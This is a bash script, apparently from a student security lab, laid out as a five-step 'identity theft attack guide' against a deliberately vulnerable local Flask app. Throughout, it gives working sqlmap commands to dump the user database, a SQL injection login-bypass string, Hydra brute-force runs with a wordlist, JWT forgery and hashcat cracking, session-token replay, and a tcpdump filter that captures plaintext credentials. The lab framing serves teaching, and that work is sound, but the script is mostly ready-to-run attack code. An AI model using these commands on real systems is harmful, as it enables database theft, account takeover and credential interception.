#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════╗
# ║  PHASE 2 — IDENTITY THEFT ATTACK GUIDE (Kali Linux VM)         ║
# ║  Target: MetaVerse Platform running on Host at PORT 5000        ║
# ║  ALL ATTACKS are on your OWN local setup — 100% ethical        ║
# ╚══════════════════════════════════════════════════════════════════╝
#
# SETUP: Find your Windows host IP from Kali:
#   ip route | grep default   → note the gateway IP (e.g. 192.168.56.1)
#   export TARGET=192.168.56.1   (replace with your host IP)
#   export TARGET_URL=http://$TARGET:5000
#
# Make sure Phase 1 app is running on Windows:
#   python init_db.py && python app.py

# ──────────────────────────────────────────────────────────────────
# ATTACK 1 — SQL INJECTION (sqlmap)
# Goal: Dump entire user database including SHA-256 hashed passwords
# ──────────────────────────────────────────────────────────────────

echo "[*] ATTACK 1: SQL Injection with sqlmap"
echo "    Target vulnerability: [V1] Raw f-string SQL query in /login"
echo ""

# Step 1: Basic injection test
sqlmap -u "http://$TARGET:5000/login" \
       --data="username=test&password=test" \
       --method=POST \
       --level=2 \
       --risk=2 \
       --batch \
       --banner

# Step 2: Dump all tables
sqlmap -u "http://$TARGET:5000/login" \
       --data="username=test&password=test" \
       --method=POST \
       --batch \
       --dump-all \
       --exclude-sysdbs

# Step 3: Target users table specifically
sqlmap -u "http://$TARGET:5000/login" \
       --data="username=test&password=test" \
       --method=POST \
       --batch \
       -T users \
       --dump

# MANUAL INJECTION — test directly in the browser login form:
# username field: alice' OR '1'='1' --
# password field: anything
# This bypasses SHA-256 check entirely!

# ──────────────────────────────────────────────────────────────────
# ATTACK 2 — BRUTE FORCE (Hydra)
# Goal: Crack alice's password using a wordlist
# ──────────────────────────────────────────────────────────────────

echo "[*] ATTACK 2: Brute Force with Hydra"
echo "    Target vulnerability: [V2] No rate limiting / lockout"
echo ""

# Create quick wordlist (or use rockyou.txt)
cat > /tmp/passwords.txt << 'EOF'
admin
password
123456
password123
bob2024
admin123
metaverse
qwerty
letmein
alice123
EOF

# Hydra HTTP POST brute force
hydra -l alice \
      -P /tmp/passwords.txt \
      $TARGET \
      http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" \
      -t 10 \
      -V \
      -s 5000

# Using rockyou.txt (more thorough — takes longer)
# hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form \
#       "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 20 -s 5000

# ──────────────────────────────────────────────────────────────────
# ATTACK 3 — JWT TOKEN FORGERY
# Goal: Forge a JWT token to access any account without credentials
# ──────────────────────────────────────────────────────────────────

echo "[*] ATTACK 3: JWT Token Forgery"
echo "    Target vulnerability: [V3] Weak JWT secret 'secret'"
echo ""

# Install jwt-cracker if not present
pip3 install pyjwt 2>/dev/null

# Run the JWT forge script
python3 jwt_forge.py

# Manually crack JWT with hashcat:
# 1. Get a JWT from the exposed URL: curl http://$TARGET:5000/api/user
# 2. Save to file: echo "eyJ..." > jwt.txt
# 3. Crack:
# hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# ──────────────────────────────────────────────────────────────────
# ATTACK 4 — SESSION HIJACKING (Burp Suite)
# Goal: Intercept JWT from network traffic and replay it
# ──────────────────────────────────────────────────────────────────

echo "[*] ATTACK 4: Session Hijacking via Burp Suite"
echo "    [Manual steps — follow in Burp Suite GUI]"
echo ""
echo "  1. Open Burp Suite → Proxy → Intercept ON"
echo "  2. Set browser proxy: 127.0.0.1:8080"
echo "  3. Log into MetaVerse as alice normally"
echo "  4. In Burp → HTTP History → find the /dashboard request"
echo "  5. Copy the 'Cookie: session=...' header value"
echo "  6. In Repeater — change user_id in the session and replay"
echo "  7. Also check [V4]: GET /api/user?token=EXPOSED_JWT_HERE"
echo "     → The JWT is shown in the dashboard — copy it directly"
echo ""

# Curl replay with stolen session token (replace STOLEN_TOKEN):
# curl -H "Cookie: session=STOLEN_FLASK_SESSION" http://$TARGET:5000/dashboard

# ──────────────────────────────────────────────────────────────────
# ATTACK 5 — NETWORK SNIFFING (tcpdump / Wireshark)
# Goal: Capture credentials in plain HTTP traffic
# ──────────────────────────────────────────────────────────────────

echo "[*] ATTACK 5: Network Sniffing"
echo "    [V5] No HTTPS — credentials sent in plain HTTP"
echo ""

# Find interface name
ip link show

# Capture HTTP POST data containing passwords
tcpdump -i eth0 -A -s 0 'tcp port 5000 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' \
  | grep -E "(username|password|token)"

# Or use tshark for structured output:
# tshark -i eth0 -f "tcp port 5000" -Y "http.request.method == POST" \
#        -T fields -e http.file_data

echo ""
echo "═══════════════════════════════════════════"
echo " ATTACK SUMMARY — Show what was obtained:"
echo "═══════════════════════════════════════════"
echo " ✅ Database dumped via SQL Injection"
echo " ✅ alice's password cracked via Hydra"
echo " ✅ JWT token forged → accessed admin account"
echo " ✅ Session replayed → impersonated alice"
echo " ✅ Credentials captured via network sniff"
echo "═══════════════════════════════════════════"
echo " → Now switch to Phase 3 (Secure App)"
echo "   to show all these attacks FAIL"
echo "═══════════════════════════════════════════"
